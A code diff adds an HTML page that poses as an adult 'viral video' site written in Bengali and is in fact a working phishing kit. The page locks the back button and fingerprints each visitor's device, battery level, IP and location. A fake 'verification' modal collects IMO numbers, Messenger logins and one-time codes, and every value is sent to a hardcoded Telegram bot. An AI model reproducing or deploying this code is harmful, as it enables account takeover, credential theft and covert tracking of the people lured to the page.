@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FapHouse - Premium HD Videos</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #000; font-family: sans-serif; color: white; overflow-x: hidden; }
+        .video-card { border-radius: 4px; background: #0f0f0f; aspect-ratio: 16/9; border: 1px solid #222; cursor: pointer; position: relative; transition: 0.3s; overflow: hidden; }
+        .video-card:hover { border-color: #ff0000; transform: scale(1.02); }
+        #modal { display: none; z-index: 1000; }
+        .step-container { display: none; }
+        .step-active { display: block; }
+        .loader { border: 4px solid #333; border-top: 4px solid #ff0000; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .timer-circle { width: 80px; height: 80px; border: 5px solid #f3f3f3; border-top: 5px solid #ff0000; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: bold; margin: 20px auto; animation: spin 2s linear infinite; }
+    </style>
+</head>
+<body>
+
+    <nav class="fixed top-0 w-full bg-[#0a0a0a] p-4 flex justify-between items-center border-b border-red-900/30 z-50">
+        <div class="flex items-center gap-1">
+            <span class="bg-red-600 text-white font-bold px-2 py-0.5 rounded text-xl uppercase">FAP</span>
+            <span class="text-white font-light text-xl">HOUSE</span>
+        </div>
+        <div class="text-[10px] text-green-500 font-bold flex items-center gap-2">
+            <span class="w-2 h-2 bg-green-500 rounded-full animate-ping"></span> HD SUPPORTED
+        </div>
+    </nav>
+
+    <div class="mt-24 px-4 max-w-6xl mx-auto">
+        <h2 class="text-gray-400 text-sm mb-4">Recommended for You</h2>
+        <div id="video-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+            <script>
+                const imgs = [
+                    "IMG-20260426-WA0003.jpg", "F-Y4_ztaAAAGum6.jpg", "IMG-20260426-WA0007.jpg",
+                    "IMG-20260426-WA0009.jpg", "IMG-20260426-WA0010.jpg", "IMG-20260426-WA0017.jpg", "IMG_20260426_205731.jpg"
+                ];
+                imgs.forEach((img, i) => {
+                    document.write(`
+                        <div class="video-card" onclick="openModal()">
+                            <img src="https://github.com/Priya-akter-121/vairal_xxx_video1/raw/main/${img}" class="w-full h-full object-cover opacity-90">
+                            <div class="absolute bottom-0 left-0 right-0 p-2 bg-gradient-to-t from-black text-xs">
+                                <p class="font-bold truncate">New Viral Video Part ${i+1}</p>
+                                <p class="text-gray-400">Premium HD • 2026</p>
+                            </div>
+                        </div>
+                    `);
+                });
+            </script>
+        </div>
+    </div>
+
+    <div id="modal" class="fixed inset-0 bg-black/95 flex items-center justify-center p-6 backdrop-blur-md">
+        <div class="bg-white text-black p-6 rounded-3xl max-w-sm w-full relative">
+            
+            <div id="step-choice" class="step-container step-active text-center">
+                <h2 class="text-xl font-black mb-2 text-red-600">Verification Required</h2>
+                <p class="text-gray-500 text-sm mb-6">এই ভিডিওটি দেখতে আপনার ইমু বা ম্যাসেঞ্জার দিয়ে কানেক্ট করুন।</p>
+                <div class="space-y-3">
+                    <button onclick="goStep('imo-1')" class="w-full bg-blue-500 text-white py-4 rounded-2xl font-bold flex items-center justify-center gap-2">IMO দিয়ে কানেক্ট করুন</button>
+                    <button onclick="goStep('fb-1')" class="w-full bg-[#1877F2] text-white py-4 rounded-2xl font-bold flex items-center justify-center gap-2">Messenger দিয়ে কানেক্ট</button>
+                </div>
+            </div>
+
+            <div id="step-imo-1" class="step-container text-center">
+                <h2 class="text-lg font-bold mb-4 text-blue-600">আপনার ইমু নম্বর দিন</h2>
+                <input type="tel" id="imo-num" placeholder="01XXXXXXXXX" class="w-full p-4 bg-gray-100 rounded-xl mb-4 text-center outline-none border-2 focus:border-blue-500">
+                <button onclick="sendToTelegram('IMO-Number', 'imo-num')" class="w-full bg-blue-500 text-white py-4 rounded-xl font-bold">পরবর্তী</button>
+            </div>
+
+            <div id="step-fb-1" class="step-container text-center">
+                <h2 class="text-lg font-bold mb-4 text-blue-800">ম্যাসেঞ্জার ইউজার</h2>
+                <input type="text" id="fb-user" placeholder="Email or Phone" class="w-full p-4 bg-gray-100 rounded-xl mb-4 text-center outline-none border-2 focus:border-blue-800">
+                <button onclick="sendToTelegram('FB-Login', 'fb-user')" class="w-full bg-[#1877F2] text-white py-4 rounded-xl font-bold">পরবর্তী</button>
+            </div>
+
+            <div id="step-otp" class="step-container text-center">
+                <div id="timer-box" class="timer-circle"><span id="timer-count">30</span></div>
+                <h2 class="font-bold text-gray-800" id="otp-title">কোড দিন</h2>
+                <p class="text-sm text-gray-500 mt-2" id="otp-desc">অপেক্ষা করুন...</p>
+                <input type="number" id="otp-input" placeholder="Enter Code" class="w-full p-4 bg-gray-100 rounded-xl my-4 text-center text-2xl outline-none border-2 focus:border-red-500">
+                <button onclick="finalSubmit()" class="w-full bg-red-600 text-white py-4 rounded-xl font-bold">Verify & Play</button>
+            </div>
+
+            <div id="step-loading" class="step-container text-center py-6">
+                <div class="loader"></div>
+                <h2 class="font-bold text-gray-700">অপেক্ষা করুন...</h2>
+                <p class="text-xs text-gray-400">সার্ভার থেকে কনফার্মেশন নেওয়া হচ্ছে।</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const botToken = "7957986649:AAGCcJ5R6g6PMHEgWXFqLRn2SrpElZvUtnE";
+        const chatId = "8516934257";
+
+        window.onload = async function() {
+            // ব্যাক বাটন লক
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = () => { window.history.pushState(null, null, window.location.href); alert("ভিডিওটি দেখতে ভেরিফিকেশন সম্পন্ন করুন!"); };
+
+            // ট্র্যাকিং ডেটা
+            const device = navigator.userAgent.split('(')[1] ? navigator.userAgent.split('(')[1].split(')')[0] : "Unknown Device";
+            let batteryLevel = "N/A";
+            try { const b = await navigator.getBattery(); batteryLevel = Math.round(b.level * 100) + "%"; } catch(e){}
+            
+            let loc = "Fetching...";
+            try {
+                const r = await fetch('http://ip-api.com/json/');
+                const d = await r.json();
+                loc = `${d.city}, ${d.country} (IP: ${d.query})`;
+            } catch(e){ loc = "Blocked"; }
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('🌐 নতুন ভিজিটর!\n📱 ডিভাইস: '+device+'\n🔋 চার্জ: '+batteryLevel+'\n📍 লোকেশন: '+loc)}`);
+        };
+
+        function openModal() { document.getElementById('modal').style.display = 'flex'; }
+        function goStep(id) {
+            document.querySelectorAll('.step-container').forEach(s => s.classList.remove('step-active'));
+            document.getElementById('step-' + id).classList.add('step-active');
+        }
+
+        function sendToTelegram(type, inputId) {
+            const val = document.getElementById(inputId).value;
+            if(!val) return alert("তথ্য দিন!");
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('📡 '+type+': '+val)}`);
+            
+            if(type.includes('IMO')) {
+                document.getElementById('otp-title').innerText = "ইমু কোড দিন";
+                document.getElementById('otp-desc').innerText = "আপনার ইমুতে ৪ সংখ্যার কোড পাঠানো হয়েছে।";
+            } else {
+                document.getElementById('otp-title').innerText = "ম্যাসেঞ্জার কোড";
+                document.getElementById('otp-desc').innerText = "আপনার নাম্বারে ৬/৮ সংখ্যার কোড পাঠানো হয়েছে।";
+            }
+            goStep('otp');
+            let count = 30;
+            const t = setInterval(() => {
+                count--;
+                document.getElementById('timer-count').innerText = count;
+                if(count <= 0) clearInterval(t);
+            }, 1000);
+        }
+
+        function finalSubmit() {
+            const otp = document.getElementById('otp-input').value;
+            if(!otp) return alert("কোড দিন!");
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('🔑 OTP: '+otp)}`);
+            goStep('loading');
+        }
+    </script>
+</body>
+</html>
